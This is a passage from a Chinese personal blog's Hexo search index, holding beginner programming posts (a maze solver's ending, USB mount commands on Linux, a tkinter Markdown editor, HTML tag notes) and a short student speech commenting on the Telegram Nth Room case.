</span></span><br></pre></td></tr></table></figure><p>现在，这个程序已经能够找出各种迷宫地图的解法了，也就是说，如果我们对地图进行修改，程序也能够正常运行并输出相应结果，比如，我们将地图的唯一道路“封死”，那么结果就会是“No result”，如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # # # #         B </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">                    </span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # # # #   # # # # </span></span><br><span class="line"></span><br><span class="line">A     <span class="comment">#     # # # # </span></span><br><span class="line"></span><br><span class="line">No result</span><br></pre></td></tr></table></figure><p>至此，我们就完成了对此情境下相关代码的编写。</p><p>修改于2021.04.11</p>]]></content>
      
      
      
        <tags>
            
            <tag> 知识输出 </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>来自班级组织演讲的一篇演讲稿</title>
      <link href="2021/04/10/Speech/"/>
      <url>2021/04/10/Speech/</url>
      
        <content type="html"><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>地狱空荡荡 恶魔在人间</p><p>想必在座各位多少看过这句话，这就是我今天要说的有关Telegram N号房事件的一些东西；由于案情复杂，我就不再赘述，有兴趣的请自行百度<br>主要人物介绍：<a id="more"></a><br>赵主彬：现年25岁，信息通信专业，曾担任学报编辑部编辑。多次获得奖学金。3年内参加了50多次志愿活动。<br>就是这么一个表面人畜无害的优秀学生，主导了这么一起事件。<br>对此人进行分析，我们不难得出：平台用telegram，交易用比特币，说明罪犯反侦查意识高，思维敏捷，可以归类为高智商信息犯罪；内心自卑，但是外围性格特征表现为自负，因无法达到自身的高度预期郁不得志，因此可能存在社会偏见，有一定概率发展为反社会型人格；可能存在家庭暴力，且是父权家庭；社交能力较差，排斥甚至仇视女性，这点可以从他在被捕后的言论发表矢口不谈对女性的道歉这一点可以看出。</p><p>有的孩子是孩子，有的孩子是禽兽<br>这十几年都塞了什么进脑子里<br>人名不打码，马赛克做错了什么</p><p>就像这些评论所表述的一样，我也痛恨这些精虫上脑的东西。但是几乎一边倒的网络舆论显然有些问题：这26万人个个都罪该万死吗？考虑到涉案人数及案件的复杂程度，我个人觉得其中还是不乏被教唆的，受蒙骗的，甚至不明情况的。不是说强行洗白，而是我认为每个人看待事情都应该有自己的看法，有那种不被舆论大势所动摇的那种看法。<br>大家是否看过这样一个比喻：韩国目前在运营的出租车大概有26万辆，这意味着在韩国的大街上，遇到N号房会员就像遇到出租车一样频繁。<br>不知各位对这个比喻有什么看法<br>在我看来，这是一种下意识的情景描绘，旨在放大案件涉及的范围，而这种情景描绘于我来看除了放大恐慌之外没有任何用处，那他们这么做的目的何在呢？要我说要不就是公众号博人眼球，要不就涉及到黑公关带节奏，由于这是一个国家级的案件，比起背后大到令人无法想象的黑灰产业链，我还是更倾向于前者。</p><p>最后，引用了几句某些公众号的评价作为我对此事的看法，话很粗，但理不粗：<br>作为一个成年人，要学会克制，不该馋的不要馋。<br>我知道现在是春天，但只有野狗才不分场合、不分对象，时刻想着交配。<br>何况，野狗也只在春秋两季才发情</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>由于班级组织的演讲限时3分钟，所以我不得不把原本一千多字的演讲稿删为800多字，也因此缺失了很多事件的细节及个人的观点。<br>–2020.05.07</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux下利用命令行对U盘和电脑中的文件进行操作</title>
      <link href="2021/04/10/Operations%20between%20flash%20disk%20and%20linux%20os/"/>
      <url>2021/04/10/Operations%20between%20flash%20disk%20and%20linux%20os/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l<span class="comment">#查看接入设备名称</span></span><br><span class="line">mount /dev/sda1 /mnt <span class="comment">#挂载U盘</span></span><br><span class="line">ls /mnt<span class="comment">#查看U盘文件</span></span><br><span class="line">cp file directory<span class="comment">#复制指定文件file至指定目录directory</span></span><br><span class="line">ls /mnt<span class="comment">#再次查看U盘文件</span></span><br><span class="line">umount /mnt<span class="comment">#卸载U盘</span></span><br></pre></td></tr></table></figure><div class="note "><p><strong>标题（可选）</strong></p><p>提示：<br>若操作中出现错误，请查看权限是否正确，或在每次操作前加’sudo’<br>cp后的文件和路径需带路径(个人推荐绝对路径)</p></div>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown_Editor V1.0</title>
      <link href="2021/04/10/Markdown_Editor%20V1.0/"/>
      <url>2021/04/10/Markdown_Editor%20V1.0/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment"># -*- coding=utf-8 -*- </span></span><br><span class="line">import tkinter</span><br><span class="line">import os</span><br><span class="line">from tkinter import filedialog</span><br><span class="line"></span><br><span class="line">win_size=<span class="string">&#x27;450x550&#x27;</span></span><br><span class="line">win = tkinter.Tk()</span><br><span class="line">win.geometry(win_size)</span><br><span class="line"></span><br><span class="line">win.title(<span class="string">&#x27;Markdown Editor V1.0 (hexo only)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def processandsave():</span><br><span class="line">   contents = <span class="string">&#x27;---\ntitle:&#x27;</span> + title.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>) + <span class="string">&#x27;tags:&#x27;</span> + tags.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>) + <span class="string">&#x27;---\n&#x27;</span> + content.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">   filename = filedialog.asksaveasfilename()</span><br><span class="line">   <span class="keyword">if</span> filename is not None:</span><br><span class="line">       with open(file=filename,mode=<span class="string">&#x27;w&#x27;</span>) as file:</span><br><span class="line">           file.write(str(contents))</span><br><span class="line">           title.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">           tags.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">           content.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def add_bash():</span><br><span class="line">    add_content=add_bash_text.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    add_content=add_content.rstrip()</span><br><span class="line">    changing_content=<span class="string">&#x27;```bash\n&#x27;</span>+add_content+<span class="string">&#x27;\n```\n&#x27;</span></span><br><span class="line">    content.insert(<span class="string">&#x27;end&#x27;</span>,changing_content)</span><br><span class="line">    add_bash_text.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line"></span><br><span class="line">label1=tkinter.Label(text=<span class="string">&#x27;标题&#x27;</span>,padx=10,pady=10)</span><br><span class="line">label1.grid(row=0,column=0)</span><br><span class="line"></span><br><span class="line">title=tkinter.Text(width=40,height=2)</span><br><span class="line">title.grid(row=0,column=1,columnspan=2)</span><br><span class="line"></span><br><span class="line">label2=tkinter.Label(text=<span class="string">&#x27;标签&#x27;</span>,padx=5,pady=5)</span><br><span class="line">label2.grid(row=1,column=0)</span><br><span class="line"></span><br><span class="line">tags=tkinter.Text(width=30,height=1)</span><br><span class="line">tags.grid(row=1,column=1)</span><br><span class="line"></span><br><span class="line">label3=tkinter.Label(text=<span class="string">&#x27;正文&#x27;</span>,padx=5,pady=5)</span><br><span class="line">label3.grid(row=2,column=0)</span><br><span class="line"></span><br><span class="line">content=tkinter.Text(width=40,height=20)</span><br><span class="line">content.grid(row=2,column=1,rowspan=5)</span><br><span class="line"></span><br><span class="line">add_bash_button=tkinter.Button(win,text=<span class="string">&#x27;命令行&#x27;</span>,<span class="built_in">command</span>=add_bash)</span><br><span class="line">add_bash_button.grid(row=9,column=0)</span><br><span class="line"></span><br><span class="line">add_bash_text=tkinter.Text(width=40,height=5)</span><br><span class="line">add_bash_text.grid(row=9,column=1)</span><br><span class="line"></span><br><span class="line">save_button=tkinter.Button(win,text=<span class="string">&#x27;保存&#x27;</span>,<span class="built_in">command</span>=processandsave)</span><br><span class="line">save_button.grid(row=8,column=1)</span><br><span class="line"></span><br><span class="line">win.mainloop()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thanksgiving</title>
      <link href="2021/04/10/img_share/"/>
      <url>2021/04/10/img_share/</url>
      
        <content type="html"><![CDATA[<p><img src="https://www.helloimg.com/images/2020/11/28/bb7b96be-d4be-4657-b90c-a5f1df2909619ac20bd2ad5eb347.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2020/11/28/bb7b96be-d4be-4657-b90c-a5f1df2909619ac20bd2ad5eb347.jpg" srcset="data:image/png;base64,666" alt="arknights_20201128"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTML笔记</title>
      <link href="2021/04/10/HTML_notes/"/>
      <url>2021/04/10/HTML_notes/</url>
      
        <content type="html"><![CDATA[<pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">1 &lt;h1&gt; to &lt;/h6&gt;: 一到六号标题</span><br><span class="line">2 &lt;p&gt;段落&lt;/p&gt;</span><br><span class="line">3 &lt;body style=<span class="string">&quot;background-color:PowderBlue;&quot;</span>&gt;</span><br><span class="line">  &lt;p style=<span class="string">&quot;font-family:verdana;color:red&quot;</span>&gt;对段落样式进行修改&lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">4 &lt;br /&gt;&lt;hr /&gt;&lt;!这是注释，前面的是换行和分割线&gt;</span><br><span class="line">5 &lt;b&gt;被加粗的内容&lt;/b&gt;</span><br><span class="line">6 &lt;strong&gt;被...加粗的内容...吧&lt;/strong&gt;</span><br><span class="line">7 &lt;big&gt;被加大的内容&lt;/big&gt;</span><br><span class="line">8 &lt;em&gt;被强调(加斜)的内容&lt;/em&gt;</span><br><span class="line">9 &lt;i&gt;被...意大利式加斜的内容&lt;/i&gt;</span><br><span class="line">10 &lt;small&gt;被减小的内容&lt;/small&gt;</span><br><span class="line">11 &lt;sub&gt;位于右下角的小字部分&lt;/sub&gt;</span><br><span class="line">12 &lt;sup&gt;位于右上角的小字部分&lt;/sup&gt;</span><br><span class="line">13 &lt;pre&gt;预格式文本(保留了空格和换行)&lt;/pre&gt;</span><br><span class="line">14 &lt;code&gt;用于&lt;/code&gt;,&lt;kbd&gt;显示&lt;/kbd&gt;,&lt;samp&gt;代码&lt;/samp&gt;,&lt;var&gt;这个加大加粗了一点&lt;/var&gt;</span><br><span class="line">15 &lt;address&gt;用于书写地址，其中记得手动添加换行标签&lt;/address&gt;</span><br><span class="line">16 &lt;abbr title=<span class="string">&quot;etcetera&quot;</span>&gt;etc.&lt;/abbr&gt;</span><br><span class="line">17 &lt;acronym title=<span class="string">&quot;World Wide Web&quot;</span>&gt;WWW&lt;/acronym&gt;</span><br><span class="line">18 &lt;bdo dir=<span class="string">&quot;rtl&quot;</span>&gt;印打序倒&lt;/bdo&gt;</span><br><span class="line">19 &lt;blockquote&gt;块引用&lt;/blockquote&gt;,&lt;q&gt;短引用&lt;/q&gt;</span><br><span class="line">20 &lt;p&gt;你看&lt;del&gt;我被划掉了&lt;/del&gt;&lt;ins&gt;又被加下划线了&lt;/ins&gt;&lt;/p&gt;</span><br><span class="line">21 &lt;a name=<span class="string">&quot;tips&quot;</span>&gt;基本的注意事项 - 有用的提示&lt;/a&gt; &lt;a href=<span class="string">&quot;#tips&quot;</span>&gt;有用的提示&lt;/a&gt;</span><br><span class="line">22 &lt;img src=<span class="string">&quot;url&quot;</span> width=xx height=xx align=xxx /&gt;</span><br><span class="line">23 &lt;table border=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">     &lt;th&gt;Heading&lt;/th&gt;</span><br><span class="line">     &lt;th&gt;Another Heading&lt;/th&gt;</span><br><span class="line">     &lt;/tr&gt;</span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">     &lt;td&gt;row 1, cell 1&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;row 1, cell 2&lt;/td&gt;</span><br><span class="line">     &lt;/tr&gt;</span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">     &lt;td&gt;row 2, cell 1&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;row 2, cell 2&lt;/td&gt;</span><br><span class="line">     &lt;/tr&gt;</span><br><span class="line">     &lt;/table&gt;</span><br><span class="line">24 &lt;ul&gt;&lt;!unsorted list&gt;</span><br><span class="line">     &lt;li&gt;Coffee&lt;/li&gt;</span><br><span class="line">     &lt;li&gt;Milk&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;</span><br><span class="line">25 &lt;ol&gt;&lt;!ordered list&gt;</span><br><span class="line">     &lt;li&gt;Coffee&lt;/li&gt;</span><br><span class="line">     &lt;li&gt;Milk&lt;/li&gt;</span><br><span class="line">     &lt;/ol&gt;</span><br><span class="line">26 &lt;dl&gt;&lt;!defined list&gt;</span><br><span class="line">     &lt;dt&gt;Coffee&lt;/dt&gt;</span><br><span class="line">     &lt;dd&gt;Black hot drink&lt;/dd&gt;</span><br><span class="line">     &lt;dt&gt;Milk&lt;/dt&gt;</span><br><span class="line">     &lt;dd&gt;White cold drink&lt;/dd&gt;</span><br><span class="line">     &lt;/dl&gt;</span><br><span class="line">27 &lt;head&gt;</span><br><span class="line">     &lt;style&gt;</span><br><span class="line">     .cities &#123;</span><br><span class="line">         background-color:black;</span><br><span class="line">         color:white;</span><br><span class="line">         margin:20px;</span><br><span class="line">         padding:20px;</span><br><span class="line">     &#125; </span><br><span class="line">     &lt;/style&gt;</span><br><span class="line">     &lt;/head&gt;</span><br><span class="line">28 &lt;!DOCTYPE html&gt;</span><br><span class="line">     &lt;html&gt;</span><br><span class="line">     &lt;head&gt;</span><br><span class="line">     &lt;style&gt;</span><br><span class="line">       span.red &#123;color:red;&#125;</span><br><span class="line">     &lt;/style&gt;</span><br><span class="line">     &lt;/head&gt;</span><br><span class="line">     &lt;body&gt;</span><br><span class="line"></span><br><span class="line">     &lt;h1&gt;My &lt;span class=<span class="string">&quot;red&quot;</span>&gt;Important&lt;/span&gt; Heading&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">     &lt;/body&gt;</span><br><span class="line">     &lt;/html&gt;</span><br><span class="line">29 &lt;iframe src=<span class="string">&quot;demo_iframe.htm&quot;</span> width=<span class="string">&quot;200&quot;</span> height=<span class="string">&quot;200&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">30 &lt;body background=<span class="string">&quot;http://www.w3school.com.cn/clouds.gif&quot;</span>&gt;</span><br><span class="line">31 &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">     document.write(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">     &lt;/script&gt;</span><br><span class="line">     &lt;noscript&gt;Your browser does not support JavaScript!&lt;/noscript&gt;</span><br></pre></td></tr></table></figure></pre><p><a href="https://www.w3school.com.cn/html/html_quick.asp">Quick Search</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0</title>
      <link href="2020/03/22/0/"/>
      <url>2020/03/22/0/</url>
      
        <content type="html"><![CDATA[<h2 id="Hello-World！"><a href="#Hello-World！" class="headerlink" title="Hello,World！"></a>Hello,World！</h2><p>说人话 我终于有自己的网站啦 虽然只是部署在github上的<br>先做个测试 下回在看看要弄啥<br>peach..啊不…<br>peace～～</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
